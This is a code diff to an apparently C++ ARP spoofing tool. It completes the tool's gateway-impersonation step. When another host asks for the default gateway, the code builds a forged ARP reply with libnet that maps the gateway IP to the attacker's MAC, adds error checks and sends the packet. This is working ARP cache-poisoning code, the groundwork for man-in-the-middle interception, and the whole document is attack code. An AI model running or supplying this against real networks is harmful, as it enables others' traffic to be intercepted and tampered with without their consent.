@@ -5,10 +5,11 @@
 #include "ArpSpoofer.h"
 #include <arpa/inet.h>
 #include <linux/filter.h>
-#include <linux/if_arp.h>
+#include <linux/if_ether.h>
 #include <sys/ioctl.h>
 #include <pcap.h>
 #include <iostream>
+#include <linux/if_packet.h>
 
 using std::cout;
 using std::endl;
@@ -65,9 +66,10 @@ void ArpSpoofer::start_spoofing(char *interface, char *target_host, char *remote
             if(macFlag && ipToInt(DEFAULT_GATEWAY_IP) == ipToInt(arpHeader->target_ip)
                && (my_ip != ipToInt(arpHeader->sender_ip))) {
                 cout << "Someone requesting gateway!!!" << endl;
-                //TODO: There we need to prepare spoofed response!!!
 
-                libnet_autobuild_arp(
+                libnet_ptag_t arp = 0, eth = 0;
+
+                arp = libnet_autobuild_arp(
                         ARPOP_REPLY,
                         my_mac->ether_addr_octet,
                         DEFAULT_GATEWAY_IP,
@@ -76,11 +78,26 @@ void ArpSpoofer::start_spoofing(char *interface, char *target_host, char *remote
                         libnet_context
                 );
 
-                libnet_autobuild_ethernet(
+                if(arp == -1){
+                    cout << "arp error: " << libnet_geterror(libnet_context) << endl;
+                }
+
+                eth = libnet_autobuild_ethernet(
                         BROADCAST_MAC,
                         ARP_ETHER_TYPE,
                         libnet_context
                 );
+
+                if(eth == -1){
+                    cout << "eth error: " << libnet_geterror(libnet_context) << endl;
+                }
+
+                if ((libnet_write (libnet_context)) == -1) {
+                    cout << "error on sending arp packet: " << libnet_geterror (libnet_context);
+                }
+
+                libnet_clear_packet (libnet_context);
+
             }
 
             cout << endl;
